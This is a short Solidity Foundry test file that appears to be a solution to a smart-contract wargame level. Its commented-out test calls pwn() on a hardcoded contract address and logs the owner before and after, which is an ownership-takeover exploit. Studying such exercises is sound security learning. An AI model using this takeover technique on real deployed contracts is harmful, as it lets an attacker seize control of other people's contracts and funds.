// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";

contract Level6Test is Test {
    address addr = 0x9a29326e01053cC1236717F7B407DF66AFF05e46;

    function setUp() public {}

    // function test_Token() public {
    //     (bool c, bytes memory d) = address(addr).call(abi.encodeWithSignature("owner()"));
    //     assertEq(c, true);
    //     address t = abi.decode(d, (address));
    //     console.log(t, "owner");
    //     (bool cc,) = address(addr).call(abi.encodeWithSignature("pwn()"));
    //     assertEq(cc, true);
    //     (bool ccc, bytes memory ddd) = address(addr).call(abi.encodeWithSignature("owner()"));
    //     assertEq(ccc, true);
    //     address tt = abi.decode(ddd, (address));
    //     console.log(tt, "new owner");
    // }
}
